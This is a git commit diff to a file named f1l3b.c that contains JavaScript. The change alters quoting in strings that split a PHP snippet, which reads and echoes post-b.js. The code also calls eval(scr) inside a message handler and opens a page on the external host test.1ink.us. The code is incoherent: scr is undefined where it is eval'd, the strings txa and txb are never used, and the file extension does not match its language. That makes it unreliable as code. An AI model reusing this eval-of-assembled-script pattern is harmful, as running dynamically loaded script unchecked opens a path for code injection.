41f11a5c0504d6ca0cae8fc760f89cb93cbb0b42
Noah Cohn <noahc42@gmail.com>
2021-07-13 19:21:28 -0700

    Update f1l3b.c

--- f1l3/f1l3b.c
+++ f1l3/f1l3b.c
@@ -17,8 +17,8 @@ let disp=document.getElementById('display').innerHTML;
 fa.addEventListener('message',e => {
 document.getElementById('strt').
 click();
-var txa = "let scr=<";
-var txb = "?php $scr=file_get_contents("post-b.js");echo"$scr";?>;";
+var txa = 'let scr=<';
+var txb = '?php $scr=file_get_contents("post-b.js");echo "$scr";?>;';
 eval(scr);
 });
 window.open("https://test.1ink.us/f1l3/f1c.php");
